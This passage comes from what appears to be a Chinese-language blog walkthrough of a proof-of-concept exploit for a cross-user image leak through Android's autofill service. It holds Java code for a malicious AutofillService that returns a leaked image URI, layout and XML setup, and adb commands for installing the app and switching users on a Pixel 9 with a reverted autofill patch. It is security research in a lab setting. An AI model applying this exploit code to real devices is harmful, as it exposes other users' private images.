<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">build</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">i</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Sending FillResponse with image URI: </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> leakedImage</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        callback</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onSuccess</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">response</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onSaveRequest</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">SaveRequest </span><span style="color:#B07D48;--shiki-dark:#BD976A">request</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">service</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">SaveCallback </span><span style="color:#B07D48;--shiki-dark:#BD976A">callback</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        callback</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onSuccess</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> AutofillId </span><span style="color:#59873A;--shiki-dark:#80A665">findFirstInput</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">AssistStructure </span><span style="color:#B07D48;--shiki-dark:#BD976A">structure</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">        int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> nodes</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> structure</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getWindowNodeCount</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        for</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#AB5959;--shiki-dark:#CB7676">int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> i</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> i </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> nodes</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> i</span><span style="color:#AB5959;--shiki-dark:#CB7676">++</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            AssistStructure</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">WindowNode</span><span style="color:#B07D48;--shiki-dark:#BD976A"> windowNode</span><span style="color:#999999;--shiki-dark:#666666"> =</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                    structure</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getWindowNodeAt</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">i</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            AssistStructure</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ViewNode</span><span style="color:#B07D48;--shiki-dark:#BD976A"> root</span><span style="color:#999999;--shiki-dark:#666666"> =</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                    windowNode</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getRootViewNode</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            AutofillId</span><span style="color:#B07D48;--shiki-dark:#BD976A"> id</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#59873A;--shiki-dark:#80A665"> dfs</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">root</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">            if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">id </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> id</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> AutofillId </span><span style="color:#59873A;--shiki-dark:#80A665">dfs</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">AssistStructure</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ViewNode </span><span style="color:#B07D48;--shiki-dark:#BD976A">node</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">node</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getAutofillId</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> !=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">                &amp;&amp;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> node</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getClassName</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> !=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">                &amp;&amp;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> node</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getClassName</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">toString</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">contains</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">EditText</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">            return</span><span style="color:#B07D48;--shiki-dark:#BD976A"> node</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getAutofillId</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        for</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#AB5959;--shiki-dark:#CB7676">int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> i</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 0</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> i </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> node</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getChildCount</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> i</span><span style="color:#AB5959;--shiki-dark:#CB7676">++</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            AutofillId</span><span style="color:#B07D48;--shiki-dark:#BD976A"> id</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#59873A;--shiki-dark:#80A665"> dfs</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">node</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getChildAt</span><span style="color:#bda437;--shiki-dark:#e6cc77">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">i</span><span style="color:#bda437;--shiki-dark:#e6cc77">)</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">            if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">id </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> id</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<p>这里显示问题：<img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767145288866-4ecd5412-f366-45e0-b693-aaed63e93099.png" alt="img"></p>
<p>后面会添加</p>
<h3 id="1-添加资源文件r-的关键来源"><a class="anchor" href="#1-添加资源文件r-的关键来源">#</a> 1. 添加资源文件（R 的关键来源）</h3>
<p>① 添加 layout,右键：res → layout</p>
<p>New → Layout Resource File</p>
<p>选，这个用代码进行布局：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767145746622-6cb42bf2-5188-4124-8de9-90570a1dfbae.png" alt="img"></p>
<p>然后把内容替换为：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-xml"><span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">LinearLayout</span><span style="color:#B07D48;--shiki-dark:#BD976A"> xmlns</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">android</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">http://schemas.android.com/apk/res/android</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">  android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">layout_width</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">match_parent</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">  android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">layout_height</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">wrap_content</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">  android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">orientation</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">vertical</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">  </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">ImageView</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">id</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@+id/leak_image</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">layout_width</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">200dp</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">layout_height</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">200dp</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">LinearLayout</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span></code></pre>
<p>② 添加 xml 目录</p>
<p>如果没有 <code>res/xml</code>：【这里以及有了】</p>
<ul>
<li>右键 <code>res</code></li>
<li>New → Android Resource Directory</li>
<li>Resource type：<strong>xml</strong></li>
</ul>
<hr>
<p>③ 添加 autofill_service.xml</p>
<p>右键：res/xml，New → Android Resource File</p>
<p>没找到Android Resource file</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767146214818-a55b2790-fd9c-486f-b836-30d2b04ee65c.png" alt="img"></p>
<p>File name：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-tex"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill_service</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767146952779-bfffd947-e9ec-4ad1-803b-00f0105cb4d7.png" alt="img"></p>
<p>内容：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-tex"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">&lt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">autofill-service xmlns:android="http://schemas.android.com/apk/res/android" /</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">&gt;</span></span></code></pre>
<h3 id="2-安装-apk"><a class="anchor" href="#2-安装-apk">#</a> 2. 安装 APK</h3>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-tex"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app/build/outputs/apk/debug/app-debug.apk</span></span></code></pre>
<p>&lt;img src="<a target="_blank" rel="noopener" href="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767148680772-a48fef30-1780-4f5c-b969-392b00f27b42.png">https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767148680772-a48fef30-1780-4f5c-b969-392b00f27b42.png</a>" alt="img" style="zoom:67%;" /&gt;</p>
<p>👉 <strong>PoC 研究完全不需要 Activity</strong></p>
<ul>
<li><strong>先成功 Build APK</strong></li>
<li>用 adb 安装：</li>
</ul>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> install</span><span style="color:#B56959;--shiki-dark:#C98A7D"> app-debug.apk</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> #【用后面的安装】</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767148829916-aa08d5e6-0dd1-4cc5-a6e0-35306abefa62.png" alt="img"></p>
<h3 id="3-漏洞利用"><a class="anchor" href="#3-漏洞利用">#</a> 3. 漏洞利用：</h3>
<p>前置条件（必须满足）</p>
<ol>
<li><strong>Pixel 9 解锁 bootloader</strong></li>
<li><strong>刷入回退 Autofill Patch 的 system.img</strong></li>
<li>至少 <strong>两个用户</strong></li>
</ol>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> create-user</span><span style="color:#B56959;--shiki-dark:#C98A7D"> testuser</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> switch-user</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 10</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767149105050-33f3e232-8d71-41e2-beda-b634dc2bfbee.png" alt="img"></p>
<p>这里自己的设备上显示有新用户，然后转换角色</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767149142595-bbf380ea-b1e4-4bbd-b40a-f0d88ba4ad25.png" alt="img"></p>
<p>Step 1：在 User 0 中准备“敏感图片”</p>
<p>手机上切换为机主然后拍个照</p>
<p>&lt;img src="<a target="_blank" rel="noopener" href="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767150274674-0be2ea29-ef25-412f-82c9-ff983ce622fd.png">https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/1767150274674-0be2ea29-ef25-412f-82c9-ff983ce622fd.png</a>" alt="img" style="zoom:33%;" /&gt;</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> list</span><span style="color:#B56959;--shiki-dark:#C98A7D"> users</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">   #执行下面的代码可以查看当前已有账号的用户ID和name</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> switch-user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">USER_I</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">D</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> #ADB切换用户的核心命令为</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> instrument</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">userI</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">d</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可针对特定用户运行插桩测试。默认情况下，此命令使用当前用户。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> install</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">userI</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">d</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可为特定用户安装软件包。要确保为所有用户安装软件包，您必须为每个用户调用此命令。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> uninstall</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#AB5959;--shiki-dark:#CB7676"> </span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#B56959;--shiki-dark:#C98A7D">userI</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">d</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可为特定用户卸载软件包。如果调用此命令时不带</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --user</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 标记，可为所有用户卸载软件包。</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> get-current-user</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 可获取当前（前台）用户</span><span style="color:#B56959;--shiki-dark:#C98A7D"> ID。</span></span>
